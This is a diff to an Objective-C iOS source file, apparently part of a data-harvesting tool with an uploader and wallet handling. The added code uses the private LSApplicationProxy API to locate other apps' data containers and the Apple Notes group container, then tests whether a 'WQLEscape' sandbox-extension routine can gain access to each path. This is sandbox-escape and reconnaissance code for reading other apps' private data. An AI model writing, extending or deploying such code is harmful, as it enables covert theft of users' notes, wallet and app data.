@@ -6,6 +6,8 @@
 #import "WQLUploader.h"
 #import <UIKit/UIKit.h>
 #import <dispatch/dispatch.h>
+#import <objc/message.h>
+#import <dlfcn.h>
 #import <stdlib.h>
 #import <sys/sysctl.h>
 #import <stdarg.h>
@@ -55,6 +57,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 - (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID;
 - (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet;
 - (void)prunePendingIfNeeded;
+- (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets;
 @property (nonatomic, assign, readwrite) BOOL lastRunUsable;
 @end
 
@@ -321,6 +324,84 @@ static uint64_t WQLFNV1a(const char *s) {
     return d.count;
 }
 
+#pragma mark - 探针（只读，不影响采集）
+
+/// 用 LSApplicationProxy 直接查已知 bundleId 的容器路径。
+/// 只验证可行性并打日志：成功也不改变本轮流程。
+- (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets {
+    static Class proxyClass;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_NOW);
+        dlopen("/System/Library/PrivateFrameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_NOW);
+        proxyClass = NSClassFromString(@"LSApplicationProxy");
+    });
+
+    [self log:@"【探针】LaunchServices 直查（只读）"];
+    SEL factory = NSSelectorFromString(@"applicationProxyForIdentifier:");
+    if (!proxyClass || ![(id)proxyClass respondsToSelector:factory]) {
+        [self log:@"    ⛔ LSApplicationProxy 不可用，索引路线作废"];
+        return;
+    }
+
+    NSUInteger total = 0, hit = 0, gotPath = 0, escaped = 0;
+    for (WQLTarget *t in targets) {
+        NSString *bid = t.bundleIDs.firstObject;
+        if (!bid.length) continue;
+        if ([bid hasPrefix:@"group."]) continue;   // group 走下面的备忘录单独探
+        total++;
+
+        id proxy = ((id (*)(id, SEL, id))objc_msgSend)((id)proxyClass, factory, bid);
+        if (!proxy) {
+            [self log:@"    · %@ → proxy=nil", bid];
+            continue;
+        }
+        hit++;
+
+        id url = ((id (*)(id, SEL))objc_msgSend)(proxy, NSSelectorFromString(@"dataContainerURL"));
+        NSString *path = [url isKindOfClass:[NSURL class]] ? [(NSURL *)url path] : nil;
+        if (!path.length) {
+            [self log:@"    · %@ → proxy 有，dataContainerURL=nil", bid];
+            continue;
+        }
+        gotPath++;
+
+        int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:nil];
+        if (handle > 0) {
+            [[WQLEscape shared] releaseHandle:handle];
+            escaped++;
+            [self log:@"    ✅ %@ → %@（escape=%lld）", bid, path, (long long)handle];
+        } else {
+            [self log:@"    ⚠️ %@ → %@（escape=%lld）", bid, path, (long long)handle];
+        }
+    }
+    [self log:@"    合计：proxy %lu/%lu，路径 %lu，可 escape %lu",
+          (unsigned long)hit, (unsigned long)total,
+          (unsigned long)gotPath, (unsigned long)escaped];
+
+    // 备忘录：用 Notes 本体的 proxy 取 App Group 容器
+    id notes = ((id (*)(id, SEL, id))objc_msgSend)((id)proxyClass, factory, @"com.apple.mobilenotes");
+    if (!notes) {
+        [self log:@"    备忘录：com.apple.mobilenotes proxy=nil"];
+        return;
+    }
+    id groups = ((id (*)(id, SEL))objc_msgSend)(notes, NSSelectorFromString(@"groupContainerURLs"));
+    if (![groups isKindOfClass:[NSDictionary class]]) {
+        [self log:@"    备忘录：groupContainerURLs=nil"];
+        return;
+    }
+    NSDictionary *g = (NSDictionary *)groups;
+    NSURL *notesURL = g[@"group.com.apple.notes"];
+    if (![notesURL isKindOfClass:[NSURL class]]) {
+        [self log:@"    备忘录：%lu 个组，没有 group.com.apple.notes", (unsigned long)g.count];
+        return;
+    }
+    NSString *notesPath = [notesURL path];
+    int64_t h = [[WQLEscape shared] consumeExtensionForPath:notesPath error:nil];
+    if (h > 0) [[WQLEscape shared] releaseHandle:h];
+    [self log:@"    备忘录：%@（escape=%lld）", notesPath, (long long)h];
+}
+
 #pragma mark - 主流程
 
 - (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
@@ -348,6 +429,7 @@ static uint64_t WQLFNV1a(const char *s) {
         return @[];
     }
     self.lastRunUsable = YES;
+    [self probeLaunchServices:targets];
 
     NSArray<NSString *> *allRoots = [self defaultRoots];
     NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
@@ -355,6 +437,13 @@ static uint64_t WQLFNV1a(const char *s) {
 
     [self log:@"【第2步 找容器目录】"];
     for (NSString *root in allRoots) {
+        struct statfs rfs;
+        if (statfs(root.fileSystemRepresentation, &rfs) == 0) {
+            [self log:@"    · %@ → 卷 %d:%d", root.lastPathComponent,
+                  rfs.f_fsid.val[0], rfs.f_fsid.val[1]];
+        } else {
+            [self log:@"    · %@ → statfs 失败", root.lastPathComponent];
+        }
         NSString *fastErr = nil;
         NSArray<NSString *> *direct = [self listChildrenOfDirectory:root error:&fastErr];
         if (direct) {
